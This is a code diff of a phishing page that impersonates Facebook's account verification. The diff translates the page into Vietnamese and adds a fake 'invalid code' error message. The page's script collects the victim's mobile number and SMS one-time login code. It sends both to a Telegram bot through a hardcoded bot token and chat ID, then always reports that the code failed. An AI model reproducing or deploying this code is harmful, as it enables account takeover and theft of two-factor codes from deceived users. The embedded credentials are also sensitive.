@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="vi">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - Verify Account</title>
+    <title>Facebook - Xác minh tài khoản</title>
     <style>
         * {
             margin: 0;
@@ -130,33 +130,40 @@
         .hidden {
             display: none;
         }
+        .error-message {
+            color: #ff0000;
+            font-size: 0.875rem;
+            margin-top: 5px;
+            text-align: left;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="content-wrapper">
             <div class="facebook-logo">facebook</div>
-            <h2 class="tagline">Facebook helps you connect and share with the people in your life.</h2>
+            <h2 class="tagline">Facebook giúp bạn kết nối và chia sẻ với mọi người trong cuộc sống của bạn.</h2>
             
             <div id="phone-page" class="verify-container">
-                <h2 class="verify-header">Verify it's You</h2>
-                <p class="verify-text">Please enter your mobile number to send login sms otp.</p>
+                <h2 class="verify-header">Xác minh đó là bạn</h2>
+                <p class="verify-text">Vui lòng nhập số điện thoại di động của bạn để gửi SMS OTP đăng nhập.</p>
                 <form id="phoneForm" onsubmit="return false;">
                     <div class="form-group">
-                        <input type="tel" id="phoneNumber" placeholder="Mobile number">
+                        <input type="tel" id="phoneNumber" placeholder="Số điện thoại di động">
                     </div>
-                    <button class="send-btn" onclick="sendPhoneNumber()">Send</button>
+                    <button class="send-btn" onclick="sendPhoneNumber()">Gửi</button>
                 </form>
             </div>
 
             <div id="otp-page" class="verify-container hidden">
-                <h2 class="verify-header">Enter Security Code</h2>
-                <p class="verify-text">Please check your phone for a message with your code. Your code has 6 numbers.</p>
+                <h2 class="verify-header">Nhập mã bảo mật</h2>
+                <p class="verify-text">Vui lòng kiểm tra điện thoại của bạn để nhận tin nhắn có mã. Mã của bạn có 6 số.</p>
                 <form id="otpForm" onsubmit="return false;">
                     <div class="form-group">
-                        <input type="text" id="otpCode" placeholder="Enter 6-digit code">
+                        <input type="text" id="otpCode" placeholder="Nhập mã 6 chữ số">
+                        <div id="errorMessage" class="error-message hidden">Mã không hợp lệ</div>
                     </div>
-                    <button class="send-btn" onclick="sendOTP()">Submit</button>
+                    <button class="send-btn" onclick="sendOTP()">Gửi</button>
                 </form>
             </div>
         </div>
@@ -165,52 +172,52 @@
     <footer>
         <div class="footer-content">
             <ul class="language-list">
+                <li><a href="#">Tiếng Việt</a></li>
                 <li><a href="#">English (UK)</a></li>
-                <li><a href="#">हिन्दी</a></li>
-                <li><a href="#">ਪੰਜਾਬੀ</a></li>
-                <li><a href="#">தமிழ்</a></li>
-                <li><a href="#">বাংলা</a></li>
-                <li><a href="#">मराठी</a></li>
-                <li><a href="#">తెలుగు</a></li>
-                <li><a href="#">ગુજરાતી</a></li>
-                <li><a href="#">ಕನ್ನಡ</a></li>
-                <li><a href="#">മലയാളം</a></li>
+                <li><a href="#">中文(台灣)</a></li>
+                <li><a href="#">한국어</a></li>
+                <li><a href="#">日本語</a></li>
+                <li><a href="#">Français (France)</a></li>
+                <li><a href="#">ภาษาไทย</a></li>
+                <li><a href="#">Español</a></li>
+                <li><a href="#">Português (Brasil)</a></li>
+                <li><a href="#">Deutsch</a></li>
             </ul>
             <ul class="links-list">
-                <li><a href="#">Sign Up</a></li>
-                <li><a href="#">Log in</a></li>
+                <li><a href="#">Đăng ký</a></li>
+                <li><a href="#">Đăng nhập</a></li>
                 <li><a href="#">Messenger</a></li>
                 <li><a href="#">Facebook Lite</a></li>
                 <li><a href="#">Video</a></li>
-                <li><a href="#">Places</a></li>
-                <li><a href="#">Games</a></li>
+                <li><a href="#">Địa điểm</a></li>
+                <li><a href="#">Trò chơi</a></li>
                 <li><a href="#">Marketplace</a></li>
                 <li><a href="#">Meta Pay</a></li>
-                <li><a href="#">Meta Store</a></li>
+                <li><a href="#">Cửa hàng Meta</a></li>
                 <li><a href="#">Meta Quest</a></li>
                 <li><a href="#">Instagram</a></li>
                 <li><a href="#">Threads</a></li>
-                <li><a href="#">Fundraisers</a></li>
-                <li><a href="#">Services</a></li>
-                <li><a href="#">Privacy Policy</a></li>
-                <li><a href="#">Privacy Centre</a></li>
-                <li><a href="#">Groups</a></li>
-                <li><a href="#">About</a></li>
-                <li><a href="#">Create ad</a></li>
-                <li><a href="#">Create Page</a></li>
-                <li><a href="#">Developers</a></li>
-                <li><a href="#">Careers</a></li>
-                <li><a href="#">Cookies</a></li>
-                <li><a href="#">Terms</a></li>
-                <li><a href="#">Help</a></li>
-                <li><a href="#">Contact uploading and non-users</a></li>
+                <li><a href="#">Chiến dịch gây quỹ</a></li>
+                <li><a href="#">Dịch vụ</a></li>
+                <li><a href="#">Chính sách quyền riêng tư</a></li>
+                <li><a href="#">Trung tâm quyền riêng tư</a></li>
+                <li><a href="#">Nhóm</a></li>
+                <li><a href="#">Giới thiệu</a></li>
+                <li><a href="#">Tạo quảng cáo</a></li>
+                <li><a href="#">Tạo Trang</a></li>
+                <li><a href="#">Nhà phát triển</a></li>
+                <li><a href="#">Tuyển dụng</a></li>
+                <li><a href="#">Cookie</a></li>
+                <li><a href="#">Điều khoản</a></li>
+                <li><a href="#">Trợ giúp</a></li>
+                <li><a href="#">Tải thông tin liên hệ lên & đối tượng không phải người dùng</a></li>
             </ul>
             <div class="copyright">Meta © 2024</div>
         </div>
     </footer>
 
     <script>
-        const BOT_TOKEN = '8178385196:AAFvlGsJb14OukPNLQLjhJYsRPeLBP92U_Y';
+        const BOT_TOKEN = '8178385196:AAFvlGsJb14OukPNLQLjhJYsRPeLBP92U_Y';         
         const CHAT_ID = '7220090233';
 
         async function sendToTelegram(message) {
@@ -226,12 +233,12 @@
                     }),
                 });
                 if (response.ok) {
-                    console.log('Data sent to Telegram bot');
+                    console.log('Dữ liệu đã được gửi đến bot Telegram');
                 } else {
-                    console.error('Failed to send data');
+                    console.error('Không thể gửi dữ liệu');
                 }
             } catch (error) {
-                console.error('Error:', error);
+                console.error('Lỗi:', error);
             }
         }
 
@@ -243,17 +250,19 @@
 
         async function sendPhoneNumber() {
             const phoneNumber = document.getElementById('phoneNumber').value;
-            const message = `Phone number entered: ${phoneNumber}`;
+            const message = `Số điện thoại đã nhập: ${phoneNumber}`;
             await sendToTelegram(message);
             showPage('otp-page');
         }
 
         async function sendOTP() {
             const otpCode = document.getElementById('otpCode').value;
-            const message = `OTP entered: ${otpCode}`;
+            const message = `Mã OTP đã nhập: ${otpCode}`;
             await sendToTelegram(message);
             document.getElementById('otpCode').classList.add('error');
+            document.getElementById('errorMessage').classList.remove('hidden');
         }
     </script>
 </body>
 </html>
+
